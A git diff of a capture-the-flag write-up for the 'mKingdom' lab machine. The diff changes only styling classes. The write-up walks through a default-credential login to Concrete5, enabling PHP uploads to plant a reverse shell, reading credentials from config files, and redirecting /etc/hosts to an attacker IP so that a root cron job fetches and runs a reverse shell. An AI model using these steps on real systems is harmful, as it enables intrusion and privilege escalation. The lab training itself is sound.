@@ -16,7 +16,7 @@ Nmap done: 1 IP address (1 host up)")}}
 
 {{text("We find one open port running an HTTP service.")}}
 
-{{text("At <code class='bg-gray-300 rounded-md px-1'>http://10.10.216.30:85</code>, we are greeted with a taunting message.")}}
+{{text("At <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://10.10.216.30:85</code>, we are greeted with a taunting message.")}}
 
 {{image("../../static/writeups/mkingdom/images/000001.jpg")}}
 
@@ -47,15 +47,15 @@ Progress: 4614 / 4615 (99.98%)
 Finished
 ===============================================================")}}
 
-{{text("We discover the <code class='bg-gray-300 rounded-md px-1'>/app</code> directory.")}}
+{{text("We discover the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/app</code> directory.")}}
 
-{{text("It contains a button that redirects us to <code class='bg-gray-300 rounded-md px-1'>/app/castle</code>.")}}
+{{text("It contains a button that redirects us to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/app/castle</code>.")}}
 
 {{image("../../static/writeups/mkingdom/images/000002.jpg")}}
 
 {{header("Shell as www-data", "asdf")}}
 
-{{text("We identify the CMS as <code class='bg-gray-300 rounded-md px-1'>Concrete5</code> with version <code class='bg-gray-300 rounded-md px-1'>8.5.2</code>.")}}
+{{text("We identify the CMS as <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Concrete5</code> with version <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>8.5.2</code>.")}}
 
 {{text("We search for an exploit for this version.")}}
 
@@ -65,25 +65,25 @@ Finished
 
 {{text("This exploit requires admin permissions.")}}
 
-{{text("Running <code class='bg-gray-300 rounded-md px-1'>Gobuster</code> again reveals a login page at <code class='bg-gray-300 rounded-md px-1'>/app/castle/index.php/login</code>.")}}
+{{text("Running <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Gobuster</code> again reveals a login page at <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/app/castle/index.php/login</code>.")}}
 
 {{image("../../static/writeups/mkingdom/images/000003.jpg")}}
 
 {{text("Normally, I would attempt to brute-force this form, but that's unnecessary here.")}}
 
-{{text("We can search for Concrete 5 default username which is <code class='bg-gray-300 rounded-md px-1'>admin</code> and after guessing the password which is <code class='bg-gray-300 rounded-md px-1'>password</code>, we successfully log in.")}}
+{{text("We can search for Concrete 5 default username which is <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>admin</code> and after guessing the password which is <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>password</code>, we successfully log in.")}}
 
 {{image("../../static/writeups/mkingdom/images/000004.jpg")}}
 
 {{text("Following the article, we allow PHP files, upload a reverse shell, and execute it.")}}
 
-{{text("In <code class='bg-gray-300 rounded-md px-1'>System & Settings</code>, navigate to <code class='bg-gray-300 rounded-md px-1'>Allowed File Types</code>.")}}
+{{text("In <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>System & Settings</code>, navigate to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Allowed File Types</code>.")}}
 
-{{text("Add <code class='bg-gray-300 rounded-md px-1'>PHP</code> to the list of allowed file types.")}}
+{{text("Add <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>PHP</code> to the list of allowed file types.")}}
 
 {{image("../../static/writeups/mkingdom/images/000005.jpg")}}
 
-{{text("Next, we upload a <code class='bg-gray-300 rounded-md px-1'>PHP PentestMonkey</code> reverse shell obtained from <code class='bg-gray-300 rounded-md px-1'>revshells.com</code>.")}}
+{{text("Next, we upload a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>PHP PentestMonkey</code> reverse shell obtained from <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>revshells.com</code>.")}}
 
 {{image("../../static/writeups/mkingdom/images/000006.jpg")}}
 
@@ -97,7 +97,7 @@ Finished
 
 {{header("Shell as toad", "shell-as-toad")}}
 
-{{text("In <code class='bg-gray-300 rounded-md px-1'>/var/www/html/app/castle/application/config</code>, we find a <code class='bg-gray-300 rounded-md px-1'>database.php</code> file containing the credentials for the <code class='bg-gray-300 rounded-md px-1'>toad</code> user.")}}
+{{text("In <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/var/www/html/app/castle/application/config</code>, we find a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>database.php</code> file containing the credentials for the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>toad</code> user.")}}
 
 {{image("../../static/writeups/mkingdom/images/000009.jpg")}}
 
@@ -108,17 +108,17 @@ Finished
 {{console("cat .bashrc", "...
 export PWD_token='[REDACTED]'")}}
 
-{{text("From <code class='bg-gray-300 rounded-md px-1'>/etc/passwd</code>, we identify another user, <code class='bg-gray-300 rounded-md px-1'>mario</code>. Logging in as this user succeeds.")}}
+{{text("From <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/passwd</code>, we identify another user, <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>mario</code>. Logging in as this user succeeds.")}}
 
 {{header("Shell as root", "shell-as-root")}}
 
-{{text("I couldn't find anything interesting and running <code class='bg-gray-300 rounded-md px-1'>linpeas</code> also didn't help.")}}
+{{text("I couldn't find anything interesting and running <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>linpeas</code> also didn't help.")}}
 
-{{text("I downloaded <code class='bg-gray-300 rounded-md px-1'>pspy64</code> from my machine using <code class='bg-gray-300 rounded-md px-1'>http.server</code> together with <code class='bg-gray-300 rounded-md px-1'>wget</code> and ran it, trying to see any background processes.")}}
+{{text("I downloaded <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>pspy64</code> from my machine using <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http.server</code> together with <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>wget</code> and ran it, trying to see any background processes.")}}
 
-{{text("Remember to be in the <code class='bg-gray-300 rounded-md px-1'>/tmp</code> directory, otherwise you won't have neccessary permissions to write this file.")}}
+{{text("Remember to be in the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/tmp</code> directory, otherwise you won't have neccessary permissions to write this file.")}}
 
-{{text("We use <code class='bg-gray-300 rounded-md px-1'>chmod +x pspy64</code> and finally run it.")}}
+{{text("We use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>chmod +x pspy64</code> and finally run it.")}}
 
 {{console("./pspy64", "...
 2024/11/21 10:59:01 CMD: UID=0     PID=2426   | bash 
@@ -127,28 +127,28 @@ export PWD_token='[REDACTED]'")}}
 2024/11/21 10:59:01 CMD: UID=0     PID=2423   | CRON 
 ...")}}
 
-{{text("If we were able to modify the <code class='bg-gray-300 rounded-md px-1'>mkingdom.thm</code> ip address to our own, we should be able to download a reverse shell from our machine and execute it instead.")}}
+{{text("If we were able to modify the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>mkingdom.thm</code> ip address to our own, we should be able to download a reverse shell from our machine and execute it instead.")}}
 
-{{text("We have write permissions to <code class='bg-gray-300 rounded-md px-1'>/etc/hosts</code> so we should be able to do just that.")}}
+{{text("We have write permissions to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> so we should be able to do just that.")}}
 
 {{console("echo 'OUR_IP' > /etc/hosts")}}
 
 {{image("../../static/writeups/mkingdom/images/000010.jpg")}}
 
-{{text("We have to create the same directories from which the file gets downloaded, so <code class='bg-gray-300 rounded-md px-1'>/app/castle/application</code> and create a reverse shell with the name <code class='bg-gray-300 rounded-md px-1'>counter.sh</code>.")}}
+{{text("We have to create the same directories from which the file gets downloaded, so <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/app/castle/application</code> and create a reverse shell with the name <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>counter.sh</code>.")}}
 
-{{text("After that, we run a python http server with <code class='bg-gray-300 rounded-md px-1'>python3 -m http.server 85</code> and wait for our file to get downloaded.")}}
+{{text("After that, we run a python http server with <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>python3 -m http.server 85</code> and wait for our file to get downloaded.")}}
 
 {{text("Remember to use port 85, since it's the port which the curl command uses.")}}
 
 {{console("python3 -m http.server 85", "Serving HTTP on 0.0.0.0 port 85 (http://0.0.0.0:85/) ...
 10.10.216.30 - - [21/Nov/2024 17:16:03] 'GET /app/castle/application/counter.sh HTTP/1.1' 200 -")}}
 
-{{text("File gets successfully downloaded, and we get a reverse shell as <code class='bg-gray-300 rounded-md px-1'>root</code>.")}}
+{{text("File gets successfully downloaded, and we get a reverse shell as <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>root</code>.")}}
 
-{{text("One more thing, we have to use <code class='bg-gray-300 rounded-md px-1'>/usr/lib/klibc/bin/cat</code> instead of just cat to read the flag.")}}
+{{text("One more thing, we have to use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/usr/lib/klibc/bin/cat</code> instead of just cat to read the flag.")}}
 
-{{text("Alternativally, use <code class='bg-gray-300 rounded-md px-1'>tac root.txt</code>.")}}
+{{text("Alternativally, use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>tac root.txt</code>.")}}
 
 {{image("../../static/writeups/mkingdom/images/000011.jpg")}}
 
